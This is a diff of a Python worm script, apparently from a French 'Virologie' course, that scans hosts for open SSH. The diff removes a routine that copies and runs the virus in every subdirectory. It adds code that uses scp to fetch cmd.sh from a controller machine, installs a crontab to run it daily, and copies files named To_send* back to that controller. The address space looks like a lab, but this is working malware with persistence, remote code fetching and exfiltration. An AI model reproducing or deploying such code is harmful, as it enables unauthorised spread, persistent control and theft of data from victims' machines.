@@ -6,7 +6,7 @@ import subprocess
 PORT=22
 #En ligne de commande :
 #Sur les deux machines : ssh-keygen
-#ssh-copy-id pierre@192.168.56.102
+#ssh-copy-id pierre@192.168.56.101
 #ssh-add
 def connectSock(listIP):
     IP=[]
@@ -19,33 +19,9 @@ def connectSock(listIP):
             IP.append(ip)
             s.close()
         except:
-            #print "cannot connect to ip : "+ip
             s.close()
             continue
     return IP
-
-def listDIR(current):
-    liste = []
-    dirList= []
-    liste = os.listdir(current)
-    for elt in liste:
-        if os.path.isdir(elt):
-            dirList.append(elt)
-    return dirList
-
-def colonize(dirList, virus):
-    novirus = "novirus.txt"
-    for elt in dirList:
-        dir = ""+elt+"/"
-        if novirus not in os.listdir(dir):
-            cmd = "cp "+virus+" "+elt+"/"
-            os.system(cmd)
-            cmd = elt+"/"
-            os.chdir(cmd)
-            os.system("pwd")
-            cmd ="python "+virus
-            os.system(cmd)
-            os.chdir("..")
 
 def isAdmin():
     command ="ip a show eno1 |grep inet |tr -s ' '|cut -d ' ' -f 3 | awk 'NR==1'"
@@ -54,9 +30,6 @@ def isAdmin():
     if ipEno1!="10.0.4.43/24\n":
         return False
     return True
-
-def dlFile():
-    print "test"
 
 if __name__=="__main__":
         listeIp = []
@@ -72,15 +45,15 @@ if __name__=="__main__":
                  os.system(cmd)
         else:
              out = subprocess.check_output(['ls','-la'])
-             if "no.txt" not in out:
-                 subprocess.call(['echo','',''])
+             if "novirus.txt" not in out:
+                 subprocess.call(['scp','pierre@10.0.4.43:~/Documents/Virologie/cmd.sh', '/home/pierre/'])
+                 subprocess.call(['touch','/tmp/crontemp.txt'])
+                 os.system('echo \"45 16 * * * ./cmd.sh\" >> /tmp/crontemp.txt')
+                 os.system('echo \"45 16 * * * scp /tmp/name/To_send* pierre@10.0.4.43:~\" >> /tmp/crontemp.txt')
+                 subprocess.call(['crontab','/tmp/crontemp.txt'])
+                 subprocess.call(['rm', '/tmp/crontemp.txt'])
              else:
                  subprocess.call(['rm', 'worm.py'])
-
-                 #dirList = listDIR(".")
-            # colonize(dirList, sys.argv[0])
-
-
 
 # |-> Si Machine Admin (Ma machine)
 #   |-> Liste @IP alive (p22)
